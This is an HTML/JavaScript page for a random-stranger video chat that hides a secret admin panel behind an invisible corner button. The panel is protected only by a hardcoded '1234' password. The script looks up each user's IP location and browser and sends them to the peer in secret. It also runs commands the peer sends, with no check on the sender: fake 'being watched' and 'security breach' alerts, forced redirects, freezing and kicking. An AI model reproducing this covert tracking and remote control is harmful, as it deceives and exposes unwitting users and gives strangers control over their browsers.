<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Video Chat | Real Admin</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* CSS Basics */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        
        body { 
            background: #0d0d0d; 
            color: white; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            overflow: hidden;
            transition: 0.3s all ease;
        }

        /* Login Screen */
        #loginScreen {
            flex: 1; display: flex; flex-direction: column;
            align-items: center; justify-content: center; padding: 20px;
        }

        .card {
            background: #1a1a1a; padding: 30px; border-radius: 15px;
            width: 100%; max-width: 400px; border: 1px solid #333; text-align: center;
        }

        h1 { color: #007aff; margin-bottom: 20px; }
        
        .my-id-box {
            background: #222; padding: 10px; margin: 15px 0; 
            font-family: monospace; font-size: 1.4rem; border: 1px dashed #555;
            cursor: pointer;
        }

        input {
            width: 100%; padding: 12px; margin-bottom: 10px; 
            background: #111; border: 1px solid #444; color: white; text-align: center; border-radius: 5px;
        }

        button {
            width: 100%; padding: 12px; border: none; border-radius: 5px;
            cursor: pointer; font-weight: bold; margin-top: 5px;
        }
        .btn-blue { background: #007aff; color: white; }
        .btn-blue:hover { background: #005bb5; }

        /* Chat Screen */
        #chatScreen { display: none; flex-direction: column; height: 100%; }

        .chat-header {
            padding: 10px 20px; background: #1a1a1a; border-bottom: 1px solid #333;
            display: flex; justify-content: space-between; align-items: center;
        }

        #videoContainer {
            display: flex; height: 50vh; background: black; border-bottom: 2px solid #007aff;
        }
        .video-box {
            flex: 1; position: relative; border-right: 1px solid #222; overflow: hidden;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
        .label {
            position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.7);
            padding: 5px 10px; font-size: 0.8rem; border-radius: 5px;
        }

        .messages-container {
            flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;
        }
        .msg { padding: 8px 12px; border-radius: 10px; max-width: 75%; font-size: 0.9rem; }
        .msg-me { background: #007aff; align-self: flex-end; }
        .msg-remote { background: #333; align-self: flex-start; }
        .msg-sys { align-self: center; color: #777; font-size: 0.8rem; }

        .input-area { padding: 15px; background: #1a1a1a; display: flex; gap: 10px; }

        /* ================= ADMIN PANEL ================= */
        /* ÿßŸÑÿ≤ÿ± ÿßŸÑÿ≥ÿ±Ÿä (ÿ¥ŸÅÿßŸÅ ÿ£ÿ≥ŸÅŸÑ ÿßŸÑŸäÿ≥ÿßÿ±) */
        #secretBtn {
            position: fixed; bottom: 0; left: 0; width: 40px; height: 40px;
            z-index: 9999; cursor: default;
        }

        #adminModal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 10000;
            justify-content: center; align-items: center; flex-direction: column;
        }

        .admin-panel {
            background: #000; border: 2px solid #00ff00; width: 90%; max-width: 500px;
            padding: 20px; font-family: monospace; color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .admin-header { display: flex; justify-content: space-between; margin-bottom: 15px; border-bottom: 1px solid #004400; padding-bottom: 10px; }
        
        .info-box {
            border: 1px dashed #004400; padding: 10px; margin-bottom: 15px; background: #001100;
        }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 0.8rem; }
        .info-val { color: white; font-weight: bold; }

        .btn-cmd {
            background: #002200; border: 1px solid #00ff00; color: #00ff00;
            padding: 8px; width: 100%; margin-bottom: 8px; cursor: pointer;
            font-family: monospace; font-weight: bold; text-align: left;
        }
        .btn-cmd:hover { background: #00ff00; color: black; }
        .btn-kick { border-color: red; color: red; background: #220000; }
        .btn-kick:hover { background: red; color: white; }

        /* Themes Effects */
        body.hacked { filter: invert(1) hue-rotate(180deg); }
        body.frozen * { pointer-events: none; opacity: 0.5; }
        
    </style>
</head>
<body>

    <!-- 1. Login -->
    <div id="loginScreen">
        <div class="card">
            <h1>üì∑ Live Chat</h1>
            <p style="color:#777; font-size:0.9rem">Your ID (Share this):</p>
            <div class="my-id-box" id="myId">Generating...</div>
            
            <input type="text" id="remoteId" placeholder="Enter Friend ID">
            <button class="btn-blue" onclick="connectManual()">Connect</button>
            <br><br>
            <button class="btn-blue" style="background:#333" onclick="startRandom()">üé≤ Random Search</button>
        </div>
    </div>

    <!-- 2. Chat -->
    <div id="chatScreen">
        <div class="chat-header">
            <h3>Connected üü¢</h3>
            <button onclick="nextUser()" style="width:auto; padding:5px 15px; background:#d32f2f; color:white;">Next / Exit</button>
        </div>

        <div id="videoContainer">
            <div class="video-box">
                <video id="localVideo" autoplay muted></video>
                <div class="label">You</div>
            </div>
            <div class="video-box">
                <div id="loadingOverlay" style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:#000; z-index:2;">
                    <span style="color:#777">Waiting for user...</span>
                </div>
                <video id="remoteVideo" autoplay></video>
                <div class="label">Stranger</div>
            </div>
        </div>

        <div class="messages-container" id="msgs"></div>

        <div class="input-area">
            <input type="text" id="msgInput" placeholder="Type a message..." onkeypress="handleEnter(event)">
            <button class="btn-blue" style="width:auto;" onclick="sendMsg()">‚û§</button>
        </div>
    </div>

    <!-- 3. ADMIN PANEL -->
    <div id="secretBtn" onclick="showAdminLogin()"></div>

    <div id="adminModal">
        <!-- Auth -->
        <div id="adminAuth" style="text-align:center;">
            <h2 style="color:#00ff00; margin-bottom:10px;">SYSTEM ACCESS</h2>
            <input type="password" id="adminPass" placeholder="Enter Password" style="background:black; border:1px solid #00ff00; color:#00ff00;">
            <br>
            <button class="btn-cmd" style="text-align:center;" onclick="verifyAdmin()">ENTER</button>
            <button onclick="closeAdmin()" style="background:none; border:none; color:#555; cursor:pointer;">Close</button>
        </div>

        <!-- Dashboard -->
        <div id="adminDash" class="admin-panel" style="display:none;">
            <div class="admin-header">
                <span>‚ö° REAL-TIME CONTROL</span>
                <button onclick="closeAdmin()" style="background:none; border:none; color:red; cursor:pointer;">X</button>
            </div>

            <!-- Spy Info -->
            <div class="info-box">
                <h4 style="border-bottom:1px solid #004400; margin-bottom:5px;">üëÅÔ∏è TARGET INFO (REAL)</h4>
                <div class="info-row"><span>Status:</span> <span class="info-val" id="admStatus">Idle</span></div>
                <div class="info-row"><span>User ID:</span> <span class="info-val" id="admTargetId">---</span></div>
                <div class="info-row"><span>IP/Country:</span> <span class="info-val" id="admCountry" style="color:yellow">Waiting...</span></div>
                <div class="info-row"><span>Browser:</span> <span class="info-val" id="admBrowser">---</span></div>
            </div>

            <!-- Commands -->
            <button class="btn-cmd" onclick="cmd('ALERT')">üì¢ Send Real Alert</button>
            <button class="btn-cmd" onclick="cmd('THEME_HACK')">üé® Change to HACKED Mode</button>
            <button class="btn-cmd" onclick="cmd('REDIRECT')">üîó Force Redirect (Google)</button>
            <button class="btn-cmd" onclick="cmd('FREEZE')">‚ùÑÔ∏è Freeze Their Browser</button>
            <hr style="border-color:#004400; margin:10px 0;">
            <button class="btn-cmd btn-kick" onclick="cmd('KICK')">‚ò†Ô∏è KICK USER (Force Reload)</button>
        </div>
    </div>

    <script>
        // --- Configuration ---
        const myId = Math.floor(10000 + Math.random() * 90000).toString();
        document.getElementById('myId').innerText = myId;
        
        let peer = new Peer(myId);
        let conn = null;
        let call = null;
        let localStream = null;
        let isSearching = false;

        // --- Get Real Info (To send to admin) ---
        let myRealInfo = { country: "Unknown", browser: navigator.userAgent };
        
        // Fetch real location from free API
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                myRealInfo.country = data.country_name || "Unknown";
                myRealInfo.city = data.city || "Unknown";
            }).catch(e => console.log("IP Info blocked by adblocker"));

        // --- Peer Events ---
        peer.on('open', id => console.log('My ID:', id));

        peer.on('connection', connection => {
            if(conn && conn.open) { connection.close(); return; }
            conn = connection;
            setupConn();
        });

        peer.on('call', incomingCall => {
            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                localStream = stream;
                document.getElementById('localVideo').srcObject = stream;
                incomingCall.answer(stream);
                call = incomingCall;
                call.on('stream', rs => {
                    document.getElementById('remoteVideo').srcObject = rs;
                    document.getElementById('loadingOverlay').style.display = 'none';
                });
                goToChat();
            });
        });

        // --- Logic ---
        function startRandom() {
            goToChat();
            isSearching = true;
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                localStream = stream;
                document.getElementById('localVideo').srcObject = stream;
                searchLoop();
            }).catch(e => alert("Camera Required!"));
        }

        function searchLoop() {
            if(!isSearching) return;
            let randomId = Math.floor(10000 + Math.random() * 90000).toString();
            if(randomId === myId) return searchLoop();

            console.log("Trying:", randomId);
            let tempConn = peer.connect(randomId);
            
            // If connected
            tempConn.on('open', () => {
                isSearching = false;
                conn = tempConn;
                setupConn();
                call = peer.call(randomId, localStream);
                call.on('stream', rs => {
                    document.getElementById('remoteVideo').srcObject = rs;
                    document.getElementById('loadingOverlay').style.display = 'none';
                });
            });

            // If error (not found), try again
            peer.on('error', err => {
                if(isSearching) setTimeout(searchLoop, 500);
            });
            // Manual timeout fallback
            setTimeout(() => { if(isSearching && !conn) searchLoop(); }, 1500);
        }

        function connectManual() {
            let id = document.getElementById('remoteId').value;
            if(!id) return alert("Enter ID");
            goToChat();
            
            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                localStream = stream;
                document.getElementById('localVideo').srcObject = stream;
                conn = peer.connect(id);
                conn.on('open', () => {
                    setupConn();
                    call = peer.call(id, stream);
                    call.on('stream', rs => {
                        document.getElementById('remoteVideo').srcObject = rs;
                        document.getElementById('loadingOverlay').style.display = 'none';
                    });
                });
            });
        }

        function setupConn() {
            updateAdminStatus("Connected", conn.peer);
            
            // 1. Send my REAL info to the other person (Secretly)
            conn.send({ type: 'INFO', data: myRealInfo });

            // 2. Listen for data
            conn.on('data', data => {
                if(data.type === 'CMD') {
                    executeRealCommand(data.action);
                } else if (data.type === 'INFO') {
                    // Received remote user info for admin panel
                    updateAdminInfo(data.data);
                } else {
                    addMsg(data, 'remote');
                }
            });

            conn.on('close', () => {
                conn = null;
                alert("Connection lost");
                location.reload();
            });
        }

        // --- REAL COMMAND EXECUTION (The Victim Side) ---
        function executeRealCommand(action) {
            console.log("Executing Admin Command:", action);
            
            if(action === 'KICK') {
                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%'>‚õî KICKED BY ADMIN</h1>";
                setTimeout(() => location.reload(), 1500);
            }
            else if (action === 'ALERT') {
                alert("‚ö†Ô∏è SYSTEM WARNING: You are being watched!");
            }
            else if (action === 'THEME_HACK') {
                document.body.classList.add('hacked');
                alert("‚ö†Ô∏è SECURITY BREACH DETECTED");
            }
            else if (action === 'REDIRECT') {
                window.location.href = "https://www.google.com";
            }
            else if (action === 'FREEZE') {
                document.body.classList.add('frozen');
                document.getElementById('msgInput').disabled = true;
            }
        }

        // --- ADMIN SENDING (The Admin Side) ---
        function cmd(action) {
            if(conn && conn.open) {
                conn.send({ type: 'CMD', action: action });
                alert("Command Sent: " + action);
                
                // If kick, close locally too
                if(action === 'KICK') {
                    setTimeout(() => location.reload(), 1000);
                }
            } else {
                alert("No active user connected!");
            }
        }

        function updateAdminInfo(info) {
            document.getElementById('admCountry').innerText = (info.country || "Unknown") + " / " + (info.city || "");
            document.getElementById('admBrowser').innerText = "Detected";
        }
        
        function updateAdminStatus(status, id) {
            document.getElementById('admStatus').innerText = status;
            document.getElementById('admTargetId').innerText = id;
        }

        // --- UI Utils ---
        function goToChat() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('chatScreen').style.display = 'flex';
        }

        function nextUser() {
            if(conn) conn.close();
            if(call) call.close();
            location.reload();
        }

        function sendMsg() {
            let input = document.getElementById('msgInput');
            let txt = input.value;
            if(txt && conn) {
                conn.send(txt);
                addMsg(txt, 'me');
                input.value = '';
            }
        }

        function addMsg(txt, type) {
            let div = document.createElement('div');
            div.className = 'msg ' + (type === 'me' ? 'msg-me' : 'msg-remote');
            div.innerText = txt;
            document.getElementById('msgs').appendChild(div);
        }
        function handleEnter(e) { if(e.key === 'Enter') sendMsg(); }

        // --- Admin Auth ---
        function showAdminLogin() {
            document.getElementById('adminModal').style.display = 'flex';
            document.getElementById('adminAuth').style.display = 'block';
            document.getElementById('adminDash').style.display = 'none';
        }
        function closeAdmin() {
            document.getElementById('adminModal').style.display = 'none';
            document.getElementById('adminPass').value = '';
        }
        function verifyAdmin() {
            if(document.getElementById('adminPass').value === '1234') {
                document.getElementById('adminAuth').style.display = 'none';
                document.getElementById('adminDash').style.display = 'flex';
            } else {
                alert("Access Denied");
            }
        }

    </script>
</body>
</html>
